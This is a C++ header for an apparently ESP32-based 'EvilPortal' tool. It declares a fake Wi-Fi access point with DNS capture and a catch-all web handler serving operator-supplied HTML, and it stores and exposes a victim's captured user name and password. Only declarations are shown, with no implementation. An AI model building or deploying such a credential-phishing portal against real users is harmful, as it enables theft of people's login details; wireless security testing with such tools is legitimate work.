#ifndef EvilPortal_h
#define EvilPortal_h

#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>

#include "configs.h"
#include "settings.h"

extern Settings settings_obj;

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"
#define MAX_HTML_SIZE 20000

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request, char * index_html) {
    request->send_P(200, "text/html", index_html);
  }
};

class EvilPortal {

  private:
    bool runServer;
    bool name_received;
    bool password_received;

    String user_name;
    String password;

    char apName[30] = "PORTAL";
    char index_html[MAX_HTML_SIZE] = "TEST";

    DNSServer dnsServer;

    void (*resetFunction)(void) = 0;

    bool checkForCommand(char *command);
    void getInitInput();
    void setupServer();
    void startPortal();
    void startAP();

  public:
    EvilPortal();

    String get_user_name();
    String get_password();
    void begin();
    void main();

};

#endif